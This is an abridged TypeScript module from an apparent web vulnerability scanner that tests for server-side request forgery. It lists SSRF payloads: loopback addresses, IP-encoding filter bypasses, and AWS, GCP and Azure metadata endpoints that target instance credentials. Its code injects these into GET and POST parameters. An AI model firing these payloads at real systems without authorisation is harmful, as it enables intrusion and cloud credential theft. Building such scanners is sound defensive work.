...
const SSRF_PAYLOADS = [
  { payload: 'http://127.0.0.1/', name: 'IPv4 loopback', markers: ['root:', 'localhost', '<html', 'Apache', 'nginx', 'IIS'], headers: {} as Record<string, string> },
  { payload: 'http://[::1]/', name: 'IPv6 loopback', markers: ['root:', 'localhost', '<html'], headers: {} as Record<string, string> },
  { payload: 'http://0x7f000001/', name: 'Hex IP bypass', markers: ['root:', 'localhost', '<html'], headers: {} as Record<string, string> },
  { payload: 'http://2130706433/', name: 'Decimal IP bypass', markers: ['root:', 'localhost', '<html'], headers: {} as Record<string, string> },
  { payload: 'http://127.1/', name: 'Short loopback (127.1)', markers: ['root:', 'localhost', '<html', 'Apache', 'nginx', 'IIS'], headers: {} as Record<string, string> },
  { payload: 'http://0/', name: 'Zero IP bypass', markers: ['root:', 'localhost', '<html'], headers: {} as Record<string, string> },
  { payload: 'http://foo@127.0.0.1/', name: 'URL credentials bypass', markers: ['root:', 'localhost', '<html'], headers: {} as Record<string, string> },
  { payload: 'http://[::ffff:127.0.0.1]/', name: 'IPv6 mapped IPv4', markers: ['root:', 'localhost', '<html'], headers: {} as Record<string, string> },
  { payload: 'http://169.254.169.254/latest/meta-data/', name: 'AWS IMDS v1', markers: ['ami-id', 'instance-id', 'iam', 'security-credentials'], headers: {} as Record<string, string> },
  { payload: 'http://169.254.169.254/latest/api/token', name: 'AWS IMDSv2 token', markers: ['ami-id', 'instance-id', 'token'], headers: {} as Record<string, string> },
  { payload: 'http://metadata.google.internal/computeMetadata/v1/', name: 'GCP metadata', markers: ['project-id', 'zone', 'attributes'], headers: { 'Metadata-Flavor': 'Google' } },
  { payload: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', name: 'Azure IMDS', markers: ['vmId', 'subscriptionId', 'resourceGroupName'], headers: {} as Record<string, string> },
];
...
export class SsrfModule implements ScanModuleInterface {
  ...
  async scan(url: string, endpoints: EndpointInfo[], client: HttpClient): Promise<ModuleFinding[]> {
    ...
    for (const ep of endpoints) {
      ...
      for (const param of urlLikeParams) {
        ...
        for (const { payload, name, markers, headers: extraHeaders } of SSRF_PAYLOADS) {
          const res = await this.injectParam(ep, param, payload, client, extraHeaders);
  ...
  private async injectParam(ep: EndpointInfo, param: string, payload: string, client: HttpClient, extraHeaders: Record<string, string> = {}) {
    if (ep.method === 'GET') {
      const u = new URL(ep.url);
      u.searchParams.set(param, payload);
      return client.send(u.href, { timeout: 8000, headers: extraHeaders });
    }
    const body = ep.params.map(p => `${encodeURIComponent(p)}=${encodeURIComponent(p === param ? payload : 'test')}`).join('&');
    return client.post(ep.url, body, { 'Content-Type': 'application/x-www-form-urlencoded', ...extraHeaders });
  }
}
